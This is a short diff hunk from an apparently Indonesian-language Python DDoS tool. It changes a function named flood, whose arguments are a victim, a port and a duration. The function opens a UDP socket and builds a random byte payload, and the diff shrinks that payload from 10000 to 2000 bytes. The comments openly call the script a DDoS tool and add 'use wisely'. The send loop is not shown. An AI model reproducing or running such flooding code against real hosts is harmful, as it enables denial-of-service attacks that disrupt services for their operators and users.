@@ -42,7 +42,7 @@ def flood(korbanmu, vport, durasi):
     # okeh kali ini kami membuat tools DDOS 
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # Gunakan Dengan Bijak Yah
-    bytes = random._urandom(10000)
+    bytes = random._urandom(2000)
     timeout =  time.time() + durasi
     sent = 99999999999999999999999999999999999
 
